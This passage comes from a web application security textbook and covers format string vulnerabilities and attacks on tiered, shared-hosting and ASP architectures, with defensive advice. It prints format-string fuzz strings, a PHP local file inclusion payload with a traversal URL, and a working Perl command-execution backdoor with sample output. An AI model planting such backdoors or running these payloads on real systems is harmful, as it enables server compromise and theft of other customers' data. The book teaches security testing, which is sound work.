 2. When the data being modified is represented in hexadecimal form, you 
should send little-endian as well as big-endian versions of each test 
case ‚Äî for example, ff7f as well as 7fff. If hexadecimal numbers are submitted in ASCII form, you should use the same case that the application 
itself uses for alphabetical characters to ensure that these are decoded 
correctly.
 3. You should monitor the application‚Äôs responses for anomalous events in 
the same way as described for buffer overflow vulnerabilities.
Format String Vulnerabilities
Format string vulnerabilities arise when user-controllable input is passed as 
the format string parameter to a function that takes format specifi ers that may 
be misused, as in the printf family of functions in C. These functions take a 
variable number of parameters, which may consist of different data types such 
as numbers and strings. The format string passed to the function contains specifi ers, which tell it what kind of data is contained in the variable parameters, and 
in what format it should be rendered.
For example, the following code outputs a message containing the value of 
the count variable, rendered as a decimal:
printf(‚ÄúThe value of count is %d‚Äù, count.);
The most dangerous format specifi er is %n. This does not cause any data to 
be printed. Rather, it causes the number of bytes output so far to be written to 
the address of the pointer passed in as the associated variable parameter. For 
example:
int count = 43;
int written = 0;
printf(‚ÄúThe value of count is %d%n.\n‚Äù, count, &written.);
printf(‚Äú%d bytes were printed.\n‚Äù, written);
outputs the following:
The value of count is 43.
24 bytes were printed.
c16.indd 643 c16.indd 643 8/19/2011 12:16:36 PM 8/19/2011 12:16:36 PM
Stuttard c16.indd V2 - 08/16/2011 Page 644
644 Chapter 16 n Attacking Native Compiled Applications 
If the format string contains more specifi ers than the number of variable 
parameters passed, the function has no way of detecting this, so it simply continues processing parameters from the call stack.
If an attacker controls all or part of the format string passed to a printfstyle function, he can usually exploit this to overwrite critical parts of process 
memory and ultimately cause arbitrary code execution. Because the attacker 
controls the format string, he can control both the number of bytes that the 
function outputs and the pointer on the stack that gets overwritten with the 
number of bytes output. This enables him to overwrite a saved return address, 
or a pointer to an exception handler, and take control of execution in much the 
same way as in a stack overfl ow.
Detecting Format String Vulnerabilities
The most reliable way to detect format string bugs in a remote application is to 
submit data containing various format specifi ers and monitor for any anomalies 
in the application‚Äôs behavior. As with uncontrolled triggering of buffer overfl ow 
vulnerabilities, it is likely that probing for format string fl aws will result in a 
crash within a vulnerable application.
HACK STEPS
 1. Targeting each parameter in turn, submit strings containing large numbers 
of the format specifiers %n and %s:
%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n
%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
Note that some format string operations may ignore the %n specifier for 
security reasons. Supplying the %s specifier instead causes the function to 
dereference each parameter on the stack, probably resulting in an access 
violation if the application is vulnerable.
 2. The Windows FormatMessage function uses specifiers in a different way 
than the printf family. To test for vulnerable calls to this function, you 
should use the following strings:
%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n! etc...
%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s! etc...
 3. Remember to URL-encode the % character as %25.
 4. You should monitor the application‚Äôs responses for anomalous events in 
the same way as described for buffer overflow vulnerabilities.
c16.indd 644 c16.indd 644 8/19/2011 12:16:36 PM 8/19/2011 12:16:36 PM
44 Stuttard c16.indd V2 - 08/16/2011 Page 645
 Chapter 16 n Attacking Native Compiled Applications 645
Summary
Software vulnerabilities in native code represent a relatively niche area in 
relation to attacks on web applications. Most applications run in a managed 
execution environment in which the classic software fl aws described in this 
chapter do not arise. However, occasionally these kinds of vulnerabilities are 
highly relevant and have been found to affect many web applications running 
on hardware devices and other unmanaged environments. A large proportion 
of such vulnerabilities can be detected by submitting a specifi c set of test cases 
to the server and monitoring its behavior.
Some vulnerabilities in native applications are relatively easy to exploit, such 
as the off-by-one vulnerability described in this chapter. However, in most cases, 
they are diffi cult to exploit given only remote access to the vulnerable application.
In contrast to most other types of web application vulnerabilities, even the act 
of probing for classic software fl aws is quite likely to cause a denial-of-service 
condition if the application is vulnerable. Before performing any such testing, 
you should ensure that the application owner accepts the inherent risks involved.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. Unless any special defenses are in place, why are stack-based buffer overfl ows generally easier to exploit than heap-based overfl ows?
 2. In the C and C++ languages, how is a string‚Äôs length determined?
 3. Why would a buffer overfl ow vulnerability in an off-the-shelf network 
device normally have a much higher likelihood of exploitation than an 
overfl ow in a proprietary web application running on the Internet?
 4. Why would the following fuzz string fail to identify many instances of 
format string vulnerabilities?
%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n...
 5. You are probing for buffer overfl ow vulnerabilities in a web application 
that makes extensive use of native code components. You fi nd a request 
that may contain a vulnerability in one of its parameters; however, the 
anomalous behavior you have observed is diffi cult to reproduce reliably. 
Sometimes submitting a long value causes an immediate crash. Sometimes 
you need to submit it several times in succession to cause a crash. And 
sometimes a crash occurs after a large number of benign requests.
What is the most likely cause of the application‚Äôs behavior?
c16.indd 645 c16.indd 645 8/19/2011 12:16:36 PM 8/19/2011 12:16:36 PM
c16.indd 646 c16.indd 646 8/19/2011 12:16:36 PM 8/19/2011 12:16:36 PM
Stuttard c17.indd V2 - 08/10/2011 Page 647
647
 C H A P T E R 
17
Attacking Application 
Architecture
Web application architecture is an important area of security that is frequently 
overlooked when the security of individual applications is appraised. In commonly used tiered architectures, a failure to segregate different tiers often means 
that a single defect in one tier can be exploited to fully compromise other tiers 
and therefore the entire application.
A different range of security threats arises in environments where multiple 
applications are hosted on the same infrastructure, or even share common 
components of a wider overarching application. In these situations, defects 
or malicious code within one application can sometimes be exploited to compromise the entire environment and other applications belonging to different 
customers. The recent rise of ‚Äúcloud‚Äù computing has increased the exposure of 
many organizations to attacks of this kind.
This chapter examines a range of different architectural confi gurations and 
describes how you can exploit defects within application architectures to advance 
your attack.
Tiered Architectures
Most web applications use a multitiered architecture, in which the application‚Äôs 
user interface, business logic, and data storage are divided between multiple 
layers, which may use different technologies and be implemented on different 
c17.indd 647 c17.indd 647 8/19/2011 12:17:15 PM 8/19/2011 12:17:15 PM
Stuttard c17.indd V2 - 08/10/2011 Page 648
648 Chapter 17 n Attacking Application Architecture
physical computers. A common three-tier architecture involves the following 
layers:
n Presentation layer, which implements the application‚Äôs interface
n Application layer, which implements the core application logic
n Data layer, which stores and processes application data
In practice, many complex enterprise applications employ a more fi ne-grained 
division between tiers. For example, a Java-based application may use the 
following layers and technologies:
n Application server layer (such as Tomcat)
n Presentation layer (such as WebWork)
n Authorization and authentication layer (such as JAAS or ACEGI)
n Core application framework (such as Struts or Spring)
n Business logic layer (such as Enterprise Java Beans)
n Database object relational mapping (such as Hibernate)
n Database JDBC calls
n Database server
A multitiered architecture has several advantages over a single-tiered design. 
As with most types of software, breaking highly complex processing tasks into 
simple and modular functional components can provide huge benefi ts in terms 
of managing the application‚Äôs development and reducing the incidence of bugs. 
Individual components with well-defi ned interfaces can be easily reused both 
within and between different applications. Different developers can work in 
parallel on components without requiring a deep understanding of the implementation details of other components. If it is necessary to replace the technology used for one of the layers, this can be achieved with minimal impact on 
the other layers. Furthermore, if well implemented, a multitiered architecture 
can help enhance the security posture of the whole application.
Attacking Tiered Architectures
A consequence of the previous point is that if defects exist within the implementation of a multitiered architecture, these may introduce security vulnerabilities. 
Understanding the multitiered model can help you attack a web application by 
helping you identify where different security defenses (such as access controls 
and input validation) are implemented and how these may break down across 
tier boundaries. A poorly designed tiered architecture may make possible three 
broad categories of attacks:
n You may be able to exploit trust relationships between different tiers to 
advance an attack from one tier to another.
c17.indd 648 c17.indd 648 8/19/2011 12:17:15 PM 8/19/2011 12:17:15 PM
Stuttard c17.indd V2 - 08/10/2011 Page 649
 Chapter 17 n Attacking Application Architecture 649
n If different tiers are inadequately segregated, you may be able to leverage a defect within one tier to directly undercut the security protections 
implemented at another tier.
n Having achieved a limited compromise of one tier, you may be able to 
directly attack the infrastructure supporting other tiers and therefore 
extend your compromise to those tiers.
We will examine these attacks in more detail.
Exploiting Trust Relationships Between Tiers
Different tiers of an application may trust one another to behave in particular 
ways. When the application is functioning as normal, these assumptions may 
be valid. However, in anomalous conditions or when under active attack, they 
may break down. In this situation, you may be able to exploit these trust relationships to advance an attack from one tier to another, increasing the signifi cance 
of the security breach.
One common trust relationship that exists in many enterprise applications is 
that the application tier has sole responsibility for managing user access. This 
tier handles authentication and session management and implements all logic 
that determines whether a particular request should be granted. If the application tier decides to grant a request, it issues the relevant commands to other 
tiers to carry out the requested actions. Those other tiers trust the application 
tier to carry out access control checks properly, and therefore they honor all 
commands they receive from the application tier.
This type of trust relationship effectively exacerbates many of the common 
web vulnerabilities examined in earlier chapters. When a SQL injection fl aw 
exists, it can often be exploited to access all data the application owns. Even if 
the application does not access the database as DBA, it typically uses a single 
account that can read and update all the application‚Äôs data. The database tier 
effectively trusts the application tier to properly control access to its data.
In a similar way, application components often run using powerful operating 
system accounts that have permission to carry out sensitive actions and access 
key fi les. In this confi guration, the operating system layer effectively trusts 
the relevant application tiers to not perform undesirable actions. If an attacker 
fi nds a command injection fl aw, he can often fully compromise the underlying 
operating system supporting the compromised application tier.
Trust relationships between tiers can also lead to other problems. If programming errors exist within one application tier, these may lead to anomalous 
behavior in other tiers. For example, the race condition described in Chapter 11 
causes the back-end database to serve up account information belonging to the 
wrong user. Furthermore, when administrators are investigating an unexpected 
event or security breach, audit logs within trusting tiers normally are insuffi cient to fully understand what has occurred, because they simply identify the 
c17.indd 649 c17.indd 649 8/19/2011 12:17:15 PM 8/19/2011 12:17:15 PM
Stuttard c17.indd V2 - 08/10/2011 Page 650
650 Chapter 17 n Attacking Application Architecture
trusted tier as the agent of the event. For example, following a SQL injection 
attack, database logs may record every query injected by the attacker. But to 
determine the user responsible, you must cross-reference these events with 
entries in the logs of the application tier, which may or may not be adequate to 
identify the perpetrator.
Subverting Other Tiers
If different tiers of the application are inadequately segregated, an attacker who 
compromises one tier may be able to directly undercut the security protections 
implemented at another tier to perform actions or access data that that tier is 
responsible for controlling.
This kind of vulnerability often arises in situations where several different 
tiers are implemented on the same physical computer. This architectural confi guration is common practice in situations where cost is a key factor.
Accessing Decryption Algorithms
Many applications encrypt sensitive user data to minimize the impact of application compromise, often to meet regulatory or compliance requirements such 
as PCI. Although passwords can be salted and hashed to ensure that they cannot be determined even if the data store is compromised, a different approach 
is needed for data where the application needs to recover the corresponding 
plaintext value. The most common examples of this are a user‚Äôs security questions (which may be verifi ed interactively with a help desk) and payment card 
information (which is needed to process payments). To achieve this, a two-way 
encryption algorithm is employed. A typical fl aw when using encryption is that 
a logical separation is not obtained between encryption keys and the encrypted 
data. A simple fl awed separation when encryption is introduced into an existing environment is to locate the algorithm and associated keys within the data 
tier, which avoids impacting the rest of the code. But if the data tier were ever 
compromised, for example via a SQL injection attack, locating and executing 
the decryption function would be a simple step for an attacker.
NOTE Regardless of the encryption process, if the application is able to 
decrypt information, and the application becomes fully compromised, an 
attacker can always fi nd a logical route to the decryption algorithm.
Using File Read Access to Extract MySQL Data
Many small applications use a LAMP server (a single computer running the 
open source software Linux, Apache, MySQL, and PHP). In this architecture, 
c17.indd 650 c17.indd 650 8/19/2011 12:17:15 PM 8/19/2011 12:17:15 PM
Stuttard c17.indd V2 - 08/10/2011 Page 651
 Chapter 17 n Attacking Application Architecture 651
a fi le disclosure vulnerability within the web application tier, which on its 
own may not represent a critical defect, can result in unrestricted access to all 
application data. This is true because MySQL data is stored in human-readable 
fi les that the web application process is often authorized to read. Even if the 
database implements strict access control over its data, and the application uses 
a range of different low-privileged accounts to connect to the database, these 
protections may be entirely undercut if an attacker can gain direct access to the 
data held within the database tier.
For example, the application shown in Figure 17-1 allows users to choose a 
skin to customize their experience. This involves selecting a cascading style 
sheets (CSS) fi le, which the application presents to the user for review.
Figure 17-1: An application containing a function to view a selected file
If this function contains a path traversal vulnerability (see Chapter 10), an 
attacker can exploit this to gain direct access to arbitrary data held within the 
MySQL database. This allows him to undercut the controls implemented within 
the database tier. Figure 17-2 shows a successful attack retrieving the usernames 
and password hashes from the MySQL user table.
c17.indd 651 c17.indd 651 8/19/2011 12:17:15 PM 8/19/2011 12:17:15 PM
Stuttard c17.indd V2 - 08/10/2011 Page 652
652 Chapter 17 n Attacking Application Architecture
Figure 17-2: An attack that undercuts the database tier to retrieve arbitrary data
TIP If an attacker has fi le-write access, he can try to write to the application‚Äôs confi guration, or write to a hosted virtual directory to get command 
execution. See the nslookup example in Chapter 10.
Using Local File Inclusion to Execute Commands
Most languages contain a function that allows a local fi le to be included within 
the current script. The ability for an attacker to specify any fi le on the fi lesystem 
is undeniably a high-risk issue. Such a fi le could be the /etc/passwd fi le or a 
confi guration fi le containing a password. In these cases the risk of information 
disclosure is obvious, but the attacker cannot necessarily escalate the attack to 
further compromise the system (unlike with remote fi le inclusion, as described 
in Chapter 10). However, it may still be possible for an attacker to execute commands by including a fi le whose contents he partially controls, as a result of 
other application or platform features.
Consider an application that takes user input within the country parameter 
in the following URL:
http://eis/mdsecportal/prefs/preference_2?country=en-gb
c17.indd 652 c17.indd 652 8/19/2011 12:17:15 PM 8/19/2011 12:17:15 PM
Stuttard c17.indd V2 - 08/10/2011 Page 653
 Chapter 17 n Attacking Application Architecture 653
A user can modify the country parameter to include arbitrary fi les. One 
possible attack might be to request URLs containing script commands so that 
these are written to the web server log fi le and then include this log fi le using 
the local fi le inclusion behavior.
An interesting method exploiting an architectural quirk in PHP is that PHP 
session variables are written to fi le in cleartext, named using the session token. 
For example, the fi le:
/var/lib/php5/sess_9ceed0645151b31a494f4e52dabd0ed7
may contain the following content, which includes a user-confi gured nickname:
logged_in|i:1;id|s:2:‚Äù24‚Äù;username|s:11:‚Äùmanicsprout‚Äù;nickname|s:22:
‚Äúmsp‚Äù;privilege|s:1:‚Äù1‚Äù;
An attacker may be able to exploit this behavior by fi rst setting his nickname 
to <?php passthru(id);?>, as shown in Figure 17-3. He can then include his 
session fi le to cause the id command to be executed using the following URL, 
as shown in Figure 17-4:
http://eis/mdsecportal/prefs/preference_2.php?country=../../../../../../
../../var/lib/php5/sess_9ceed0645151b31a494f4e52dabd0ed7%00
Figure 17-3: Configuring a nickname containing server-executable script code
c17.indd 653 c17.indd 653 8/19/2011 12:17:16 PM 8/19/2011 12:17:16 PM
Stuttard c17.indd V2 - 08/10/2011 Page 654
654 Chapter 17 n Attacking Application Architecture
Figure 17-4: Executing the session file containing the malicious nickname via the 
local file inclusion function
HACK STEPS
 1. As described throughout this book, for any vulnerability you identify within the application, think imaginatively about how this can be 
exploited to achieve your objectives. Countless successful hacks against 
web applications begin from a vulnerability that is intrinsically limited 
in its impact. By exploiting trust relationships and undercutting controls 
implemented elsewhere within the application, it may be possible to 
leverage a seemingly minor defect to carry out a serious breach.
 2. If you succeed in performing arbitrary command execution on any component of the application, and you can initiate network connections to other 
hosts, consider ways of directly attacking other elements of the application‚Äôs infrastructure at the network and operating system layers to expand 
the scope of your compromise.
Securing Tiered Architectures
If carefully implemented, a multitiered architecture can considerably enhance 
an application‚Äôs security, because it localizes the impact of a successful attack. 
In the basic LAMP confi guration described previously, in which all components run on a single computer, the compromise of any tier is likely to lead 
to complete compromise of the application. In a more secure architecture, the 
compromise of one tier may result in partial control over an application‚Äôs data 
and processing, but it may be more limited in its impact and perhaps contained 
to the affected tier.
Minimize Trust Relationships
As far as possible, each tier should implement its own controls to defend against 
unauthorized actions and should not trust other application components to 
c17.indd 654 c17.indd 654 8/19/2011 12:17:16 PM 8/19/2011 12:17:16 PM
Stuttard c17.indd V2 - 08/10/2011 Page 655
 Chapter 17 n Attacking Application Architecture 655
prevent security breaches that the tier itself can help block. Here are some 
examples of this principle being applied to different tiers of the application:
n The application server tier can enforce role-based access control over specifi c 
resources and URL paths. For example, the application server can verify 
that any request for the /admin path was received from an administrative 
user. Controls can also be imposed over different kinds of resources, such 
as specifi c types of scripts and static resources. This mitigates the impact 
of certain kinds of access control defects within the web application tier, 
because users who are not authorized to access certain functionality will 
have their request blocked before it reaches that tier.
n The database server tier can provide various accounts for use by the application for different users and different actions. For example, actions on behalf 
of unauthenticated users can be carried out with a low-privileged account 
allowing read-only access to a restricted set of data. Different categories 
of authenticated users can be assigned different database accounts, granting read-and-write access to different subsets of the application‚Äôs data, in 
line with the user‚Äôs role. This mitigates the impact of many SQL injection 
vulnerabilities, because a successful attack may result in no further access 
than the user could legitimately obtain by using the application as intended.
n All application components can run using operating system accounts 
that possess the least level of privileges required for normal operation. 
This mitigates the impact of any command injection or fi le access fl aws 
within these components. In a well-designed and fully hardened architecture, vulnerabilities of this kind may provide an attacker with no useful 
opportunities to access sensitive data or perform unauthorized actions.
Segregate Different Components
As far as possible, each tier should be segregated from interacting with other 
tiers in unintended ways. Implementing this objective effectively may in some 
cases require different components to run on different physical hosts. Here are 
some examples of this principle being applied:
n Different tiers should not have read- or write-access to fi les used by other 
tiers. For example, the application tier should not have any access to the 
physical fi les used to store database data, and should only be able to 
access this data in the intended manner using database queries with an 
appropriate user account.
n Network-level access between different infrastructure components should 
be fi ltered to permit only services with which different application tiers 
are intended to communicate. For example, the server hosting the main 
c17.indd 655 c17.indd 655 8/19/2011 12:17:16 PM 8/19/2011 12:17:16 PM
Stuttard c17.indd V2 - 08/10/2011 Page 656
656 Chapter 17 n Attacking Application Architecture
application logic may be permitted to communicate with the database 
server only via the port used to issue SQL queries. This precaution will 
not prevent attacks that actually use this service to target the database 
tier. But it will prevent infrastructure level attacks against the database 
server, and it will contain any operating system level compromise from 
reaching the organization‚Äôs wider network.
Apply Defense in Depth
Depending on the exact technologies in use, a variety of other protections can 
be implemented within different components of the architecture to support the 
objective of localizing the impact of a successful attack. Here are some examples 
of these controls:
n All layers of the technology stack on every host should be security hardened, 
in terms of both confi guration and vulnerability patching. If a server‚Äôs 
operating system is insecure, an attacker exploiting a command injection 
fl aw with a low-privileged account may be able to escalate privileges to 
fully compromise the server. The attack may then propagate through the 
network if other hosts have not been hardened. On the other hand, if the 
underlying servers are secured, an attack may be fully contained within 
one or more tiers of the application.
n Sensitive data persisted in any tier of the application should be encrypted 
to prevent easy disclosure in the event that that tier is compromised. User 
credentials and other sensitive information, such as credit card numbers, 
should be stored in encrypted form within the database. Where available, 
built-in protection mechanisms should be used to protect database credentials held on the web application tier. For example, in ASP.NET 2.0, an 
encrypted database connection string can be stored in the web.config fi le.
Shared Hosting and Application Service Providers
Many organizations use external providers to help deliver their web applications to the public. These arrangements range from simple hosting services 
in which an organization is given access to a web and/or database server, to 
full-fl edged application service providers (ASPs) that actively maintain the 
application on behalf of the organization. Arrangements of this kind are ideal 
for small businesses that do not have the skills or resources to deploy their own 
application, but they are also used by some high-profi le companies to deploy 
specifi c applications.
Most providers of web and application hosting services have many customers and typically support multiple customers‚Äô applications using the same 
c17.indd 656 c17.indd 656 8/19/2011 12:17:16 PM 8/19/2011 12:17:16 PM
Stuttard c17.indd V2 - 08/10/2011 Page 657
 Chapter 17 n Attacking Application Architecture 657
infrastructure, or closely connected infrastructures. An organization that chooses 
to use one of these services therefore must consider the following related threats:
n A malicious customer of the service provider may attempt to interfere 
with the organization‚Äôs application and its data.
n An unwitting customer may deploy a vulnerable application that enables 
malicious users to compromise the shared infrastructure and thereby 
attack the organization‚Äôs application and its data.
Web sites hosted on shared systems are prime targets for script kiddies seeking to deface as many web sites as possible, because compromising a single 
shared host can often enable them to attack hundreds of apparently autonomous 
web sites in a short period of time.
Virtual Hosting
In simple shared hosting arrangements, a web server may simply be confi gured 
to support multiple virtual web sites with different domain names. This is 
achieved via the Host header, which is mandatory in HTTP version 1.1. When 
a browser issues an HTTP request, it includes a Host header containing the 
domain name contained in the relevant URL and sends the request to the IP 
address associated with that domain name. If multiple domain names resolve 
to the same IP address, the server at this address can still determine which 
web site the request is for. For example, Apache can be confi gured to support 
multiple web sites using the following confi guration, which sets a different web 
root directory for each virtually hosted site:
<VirtualHost *>
 ServerName wahh-app1.com
 DocumentRoot /www/app1
</VirtualHost>
<VirtualHost *>
 ServerName wahh-app2.com
 DocumentRoot /www/app2
</VirtualHost>
Shared Application Services
Many ASPs provide ready-made applications that can be adapted and customized 
for use by their customers. This model is cost-effective in industries where large 
numbers of businesses need to deploy highly functional and complex applications that 
provide essentially the same functionality to their end users. By using the services 
of an ASP, businesses can quickly acquire a suitably branded application without 
incurring the large setup and maintenance costs that this would otherwise involve.
c17.indd 657 c17.indd 657 8/19/2011 12:17:16 PM 8/19/2011 12:17:16 PM
Stuttard c17.indd V2 - 08/10/2011 Page 658
658 Chapter 17 n Attacking Application Architecture
The market for ASP applications is particularly mature in the fi nancial services 
industry. For example, a given country may have thousands of small retailers 
that want to offer their customers in-store payment cards and credit facilities. 
These retailers outsource this function to dozens of different credit card providers, many of whom are themselves start-ups rather than long-established banks. 
These credit card providers offer a commoditized service in which cost is the 
main discriminator. Accordingly, many of them use an ASP to deliver the web 
application that is provided to end users. Within each ASP, the same application 
therefore is customized for a huge number of different retailers.
Figure 17-5 illustrates the typical organization and division of responsibilities 
in this kind of arrangement. As you can see from the numerous agents and tasks 
involved, this setup involves the same kinds of security problems as the basic shared 
hosting model; however, the issues involved may be more complex. Furthermore, 
additional problems are specifi c to this arrangement, as described in the next section.
Figure 17-5: The organization of a typical application service provider
Application Service
Provider (ASP)
Credit card companies
High street retailers
End users
Host and maintain infrastructure,
develop core application, provide
updates and support
Customize core
functionality according to
their business offering
Customize application
skin and non-functional
content
Use applications to
access statements
& make payments
Attacking Shared Environments
Shared hosting and ASP environments introduce a range of new potential 
vulnerabilities by which an attacker can target one or more applications within 
the shared infrastructure.
Attacks Against Access Mechanisms
Because various external organizations have a legitimate need to update and 
customize the different applications in a shared environment, the provider 
c17.indd 658 c17.indd 658 8/19/2011 12:17:16 PM 8/19/2011 12:17:16 PM
Stuttard c17.indd V2 - 08/10/2011 Page 659
 Chapter 17 n Attacking Application Architecture 659
needs to implement mechanisms by which this remote access can be achieved. 
In the simplest case of a virtually hosted web site, this may merely involve an 
upload facility such as FTP or SCP, via which customers can write fi les within 
their own web root.
If the hosting arrangement includes provision of a database, customers may 
need to obtain direct access to confi gure their own database setup and retrieve 
data that the application has stored. In this situation, providers may implement 
a web interface to certain database administrative functions or may even expose 
the actual database service on the Internet, allowing customers to connect 
directly and use their own tools.
In full-blown ASP environments, where different types of customers need to 
perform different levels of customization on elements of the shared application, 
providers often implement highly functional applications that customers can 
use for these tasks. These are often accessed via a virtual private network (VPN) 
or a dedicated private connection into the ASP‚Äôs infrastructure.
Given the range of remote access mechanisms that may exist, a number of 
different attacks may be possible against a shared environment:
n The remote access mechanism itself may be insecure. For example, the 
FTP protocol is unencrypted, enabling a suitably positioned attacker (for 
example, within a customer‚Äôs own ISP) to capture login credentials. Access 
mechanisms may also contain unpatched software vulnerabilities or confi guration defects that enable an anonymous attacker to compromise the 
mechanism and interfere with customers‚Äô applications and data.
n The access granted by the remote access mechanism may be overly liberal 
or poorly segregated between customers. For example, customers may be 
given a command shell when they require only fi le access. Alternatively, 
customers may not be restricted to their own directories and may be able 
to update other customers‚Äô content or access sensitive fi les on the server 
operating system.
n The same considerations apply to databases as for fi lesystem access. The 
database may not be properly segregated, with different instances for 
each customer. Direct database connections may use unencrypted channels such as standard ODBC.
n When a customized application is deployed for the purpose of remote access 
(for example, by an ASP), this application must take on the responsibility 
of controlling different customers‚Äô access to the shared application. Any 
vulnerabilities within the administrative application may allow a malicious 
customer or even an anonymous user to interfere with the applications of 
other customers. They may also allow customers with the limited capability to update their application‚Äôs skin to escalate privileges and modify 
elements of the core functionality involved in their application to their 
c17.indd 659 c17.indd 659 8/19/2011 12:17:17 PM 8/19/2011 12:17:17 PM
Stuttard c17.indd V2 - 08/10/2011 Page 660
660 Chapter 17 n Attacking Application Architecture
advantage. Where this kind of administrative application is deployed, 
any kind of vulnerability within this application may provide a vehicle 
to attack the shared application accessed by end users.
Attacks Between Applications
In a shared hosting environment, different customers typically have a legitimate 
need to upload and execute arbitrary scripts on the server. This immediately 
raises problems that do not exist in single-hosted applications.
Deliberate Backdoors
In the most obvious kind of attack, a malicious customer may upload content 
that attacks the server itself or other customers‚Äô applications. For example, consider the following Perl script, which implements a remote command facility 
on the server:
#!/usr/bin/perl
use strict;
use CGI qw(:standard escapeHTML);
print header, start_html(‚Äú‚Äù);
if (param()){my $command = param(‚Äúcmd‚Äù);
 $command=`$command`;
print ‚Äú$command\n‚Äù;}
else {print start_form(); textfield(‚Äúcommand‚Äù);}
print end_html;
Accessing this script over the Internet enables the customer to execute arbitrary operating system commands on the server:
GET /scripts/backdoor.pl?cmd=whoami HTTP/1.1
Host: wahh-maliciousapp.com
HTTP/1.1 200 OK
Date: Sun, 03 Jul 2011 19:16:38 GMT
Server: Apache/2.0.59
Connection: close
Content-Type: text/html; charset=ISO-8859-1
<!DOCTYPE html
 PUBLIC ‚Äú-//W3C//DTD XHTML 1.0 Transitional//EN‚Äù
 ‚Äúhttp://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd‚Äù>
<html xmlns=‚Äùhttp://www.w3.org/1999/xhtml‚Äù lang=‚Äùen-US‚Äù xml:lang=‚Äùen-US‚Äù>
<head>
<title>Untitled Document</title>
<meta http-equiv=‚ÄùContent-Type‚Äù content=‚Äùtext/html; charset=iso-8859-1‚Äù />
c17.indd 660 c17.indd 660 8/19/2011 12:17:17 PM 8/19/2011 12:17:17 PM
Stuttard c17.indd V2 - 08/10/2011 Page 661
 Chapter 17 n Attacking Application Architecture 661
</head>
<body>
apache
</body>
</html>
Because the malicious customer‚Äôs commands are executing as the Apache 
user, it is likely that this will allow access to the scripts and data belonging to 
other customers of the shared hosting service.
This kind of threat also exists in the context of an ASP-managed shared application. Although the core application functionality is owned and updated by 
the ASP, individual customers typically can modify this functionality in certain 
defi ned ways. A malicious customer may introduce subtle backdoors into code 
that he controls, enabling him to compromise the shared application and gain 
access to other customers‚Äô data.
TIP Backdoor scripts can be created in most web scripting languages. For 
more examples of scripts in other languages, see http://net-square.com/
papers/one_way/one_way.html#4.0.
Attacks Between Vulnerable Applications
Even if all customers in a shared environment are benign, and upload only 
legitimate scripts that are validated by the environment‚Äôs owner, attacks between 
applications will, of course, be possible if vulnerabilities unwittingly exist within 
the applications of individual customers. In this situation, one vulnerability 
within a single application may enable a malicious user to compromise both 
that application and all others hosted within the shared environment. Many 
types of common vulnerability fall into this category. For example:
n A SQL injection fl aw in one application may enable an attacker to perform arbitrary SQL queries on the shared database. If database access is 
inadequately segregated between different customers, an attacker may 
be able to read and modify the data used by all applications.
n A path traversal vulnerability in one application may enable an attacker 
to read or write arbitrary fi les anywhere on the server fi lesystem, including those belonging to other applications.
n A command injection fl aw in one application may enable an attacker to 
compromise the server and, therefore, the other applications hosted on 
it, in the same way as described for a malicious customer.
Attacks Between ASP Application Components
The possible attacks described previously may all arise in the context of a 
shared ASP application. Because customers typically can perform their own 
c17.indd 661 c17.indd 661 8/19/2011 12:17:17 PM 8/19/2011 12:17:17 PM
Stuttard c17.indd V2 - 08/10/2011 Page 662
662 Chapter 17 n Attacking Application Architecture
customizations to core application functionality, a vulnerability introduced by 
one customer may enable users of a customized application to attack the main 
shared application, thereby compromising the data of all the ASP‚Äôs customers.
In addition to these attacks, the ASP scenario introduces further possibilities 
for malicious customers or users to compromise the wider shared application, 
because of how different components of the shared application must interoperate. For example:
n Data generated by different applications is often collated in a common 
location and viewed by ASP-level users with powerful privileges within 
the shared application. This means that an XSS-type attack within a customized application may result in compromise of the shared application. 
For example, if an attacker can inject JavaScript code into log fi le entries, 
payment records, or personal contact information, this may enable him 
to hijack the session of an ASP-level user and therefore gain access to 
sensitive administrative functionality.
n ASPs often employ a shared database to hold data belonging to all customers. Strict segregation of data access may or may not be enforced at 
the application and database layers. However, in either case some shared 
components typically exist, such as database stored procedures, that are 
responsible for processing data belonging to multiple customers. Defective 
trust relationships or vulnerabilities within these components may allow 
malicious customers or users to gain access to data in other applications. 
For example, a SQL injection vulnerability in a shared stored procedure 
that runs with defi ner privileges may result in the compromise of the 
entire shared database.
HACK STEPS
 1. Examine the access mechanisms provided for customers of the shared 
environment to update and manage their content and functionality. 
Consider questions such as the following:
n Does the remote access facility use a secure protocol and suitably 
hardened infrastructure?
n Can customers access files, data, and other resources that they do not 
legitimately need to access?
n Can customers gain an interactive shell within the hosting environment and perform arbitrary commands?
 2. If a proprietary application is used to allow customers to configure and 
customize a shared environment, consider targeting this application as a 
means of compromising the environment itself and individual applications 
running within it.
c17.indd 662 c17.indd 662 8/19/2011 12:17:17 PM 8/19/2011 12:17:17 PM
Stuttard c17.indd V2 - 08/10/2011 Page 663
 Chapter 17 n Attacking Application Architecture 663
 3. If you can achieve command execution, SQL injection, or arbitrary file 
access within one application, investigate carefully whether this provides 
any means of escalating your attack to target other applications.
 4. If you are attacking an ASP-hosted application that is made up of both 
shared and customized components, identify any shared components 
such as logging mechanisms, administrative functions, and database code 
components. Attempt to leverage these to compromise the shared portion 
of the application and thereby attack other individual applications.
 5. If a common database is used within any kind of shared environment, 
perform a comprehensive audit of the database configuration, patch level, 
table structure, and permissions, perhaps using a database scanning tool 
such as NGSSquirrel. Any defects within the database security model may 
provide a means of escalating an attack from within one application to 
another.
Attacking the Cloud
The ubiquitous buzzword ‚Äúcloud‚Äù refers roughly to the increased outsourcing 
of applications, servers, databases, and hardware to external service providers. 
It also refers to the high degree of virtualization employed in today‚Äôs shared 
hosting environments.
Cloud services broadly describes on-demand Internet-based services that 
provide an API, application, or web interface for consumer interaction. The 
cloud computing provider normally stores user data or processes business logic 
to provide the service. From an end-user perspective, traditional desktop applications are migrating to cloud-based equivalents, and businesses can replace 
entire servers with on-demand equivalents.
A frequently mentioned security concern in moving to cloud services is loss 
of control. Unlike with traditional server or desktop software, there is no way 
for a consumer to proactively assess the security of a particular cloud service. 
Yet the consumer is required to hand over all responsibility for the service 
and data to a third party. For businesses, more control is being ceded to an 
